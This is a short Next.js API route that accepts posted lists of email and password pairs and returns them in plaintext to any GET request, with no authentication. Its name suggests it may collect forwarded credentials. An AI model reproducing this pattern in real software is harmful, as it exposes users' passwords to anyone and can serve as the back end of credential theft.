// app/api/forwarded/route.ts
import {NextRequest, NextResponse} from 'next/server';

let latestStack: {email: string, password: string}[] = [];

export async function POST(req: NextRequest) {
  const body = await req.json();
  latestStack = body.stack ?? [];
  return NextResponse.json({status: 'ok'});
}

export async function GET() {
  return NextResponse.json(latestStack);
}
